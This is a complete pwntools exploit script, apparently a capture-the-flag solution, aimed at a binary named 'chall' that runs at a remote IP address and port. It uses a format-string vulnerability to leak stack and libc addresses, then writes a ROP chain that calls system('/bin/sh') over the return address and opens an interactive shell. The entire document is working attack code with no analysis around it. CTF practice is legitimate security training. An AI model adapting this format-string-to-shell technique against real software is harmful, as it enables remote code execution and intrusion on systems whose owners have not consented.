#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
gdb_script = """
b *main+475
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("157.180.85.167", 20003)

    return r

libc_off = 0x23a90
ret_off = 0x4c8
offset = 38
pop_rdi_off = 0x240e5
ret_gadget_off = 0x23159
def main():
    r = conn()
    # good luck pwning :)
    # ====================handle leak====================
    # stack leak at the first index 
    # libc leak at the 105s index
    # leak format => Name: LEAK-%p-%p-%p-%p-%p
    # Welcome LEAK-0x7fffffffd610-(nil)-(nil)-(nil)-0x7ffff7fccfb0
    # ===================================================
    payload = b'LEAK-%p-'+b'%c' * 103 + b'-%p'
    r.sendline(payload)
    r.recvuntil(b'LEAK-')
    leak = r.recvline().strip().split(b'-')
    stack_leak = int(leak[0], 16)
    libc_leak = int(leak[2], 16)
    log.info(f'stack_leak: {hex(stack_leak)}')
    log.info(f'libc_leak: {hex(libc_leak)}')
    libc.address    = libc_leak - 0x23a90
    success(f'libc_base: {hex(libc.address)}')
    # =========================calcs==========================
    binsh  = next(libc.search(b'/bin/sh'))
    ret_addr = stack_leak + ret_off
    pop_rdi = libc.address + pop_rdi_off
    ret_gadget = libc.address + ret_gadget_off
    # =======================exploit=========================
    rop = { 
        ret_addr:ret_gadget,
        ret_addr+8:pop_rdi,
        ret_addr+16:binsh,
        ret_addr+24:libc.symbols.system
    }
    payload = fmtstr_payload(offset=offset, writes=rop, numbwritten=0, write_size='short', no_dollars=True)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
